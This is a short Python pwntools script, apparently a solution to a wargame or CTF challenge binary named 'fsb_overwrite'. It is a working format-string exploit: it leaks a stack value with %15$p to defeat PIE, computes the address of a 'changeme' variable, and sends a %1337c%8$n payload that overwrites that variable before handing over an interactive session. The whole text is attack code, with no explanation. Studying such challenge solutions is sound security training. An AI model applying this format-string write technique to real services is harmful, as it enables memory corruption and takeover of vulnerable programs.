from pwn import *
p = remote(주소, PORT)
elf = ELF("./fsb_overwrite")
p.sendline(b'%15$p')
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changename = code_base + elf.symbols['changeme']
payload = b'%1337c'
payload += b'%8$n'
payload += b'A' * 6
payload += p64(changename)
p.sendline(payload)
p.interactive()